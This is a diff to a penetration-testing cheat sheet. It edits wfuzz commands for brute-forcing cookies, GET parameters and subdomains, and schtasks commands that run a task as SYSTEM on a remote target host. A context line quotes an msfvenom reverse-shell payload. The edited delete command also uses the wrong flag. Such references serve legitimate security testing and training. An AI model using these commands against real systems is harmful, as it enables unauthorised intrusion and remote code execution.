@@ -431,7 +431,6 @@ KWProcessor - Keyboard walks
 ### Fuzzing:
 
 `wfuzz - The web brute forcer`\
-
 Cookie fuzzer: `wfuzz -c --hs incorrect -z file,/usr/share/wordlists/wfuzz/general/medium.txt -H "Cookie: password=FUZZ" http://$IP`\
 HTTP GET Parameter fuzzer: `wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/medium.txt http://$IP/?FUZZ=test`\
 Subdomain fuzzing: `wfuzz -w /usr/share/wordlists/dirb/common.txt -c --hc 404,400,301 -hl 222 -u http://$ip -H "Host: FUZZ.domain.name"`
@@ -544,11 +543,9 @@ Netcat reverse shell (staged): `msfvenom -p windows/shell/reverse_tcp LHOST=10.0
 
 ### Windows scheduled task
 ```
-schtasks /create /tn ExampleTask /tr c:\windows\system32\calc.exe /sc once /st 00:00 /S host.domain /RU System
-
-schtasks /run /tn ExampleTask /S host.domain
-
-schtasks /F /delete /tn ExampleTask /S host.domain
+schtasks /Create /tn ExampleTask /TR c:\windows\system32\calc.exe /SC once /ST 00:00 /S target.host.domain /RU System
+schtasks /Run /TN ExampleTask /S target.host.domain
+schtasks /F /Delete /TR ExampleTask /S target.host.domain
 ```
 ## Port forwarding/masquerading
 
